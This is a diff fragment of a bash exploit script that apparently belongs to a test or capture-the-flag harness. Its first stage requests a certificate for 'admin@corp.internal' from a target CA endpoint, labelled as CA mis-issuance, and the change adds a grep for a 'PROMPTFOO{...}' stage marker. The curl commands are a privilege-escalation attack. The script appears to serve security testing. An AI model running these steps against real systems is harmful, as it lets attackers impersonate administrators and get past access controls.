@@ -6,7 +6,9 @@ set -euo pipefail
 BASE="${1:-http://target:8080}"
 
 echo "[*] stage 1 — enroll a cert for a privileged identity (CA mis-issuance) ->"
-cert="$(curl -s "$BASE/ca/enroll?cn=admin@corp.internal" | python3 -c 'import sys,json;print(json.load(sys.stdin)["certificate"])')"
+resp="$(curl -s "$BASE/ca/enroll?cn=admin@corp.internal")"
+printf '%s\n' "$resp" | grep -oE 'PROMPTFOO\{[^}]*\}' | head -n1 || true   # s10a_cert stage marker (per-hop verify §6.3)
+cert="$(printf '%s' "$resp" | python3 -c 'import sys,json;print(json.load(sys.stdin)["certificate"])')"
 echo "    cert=$cert"
 
 echo "[*] stage 2 — present the cert to the protected service ->"
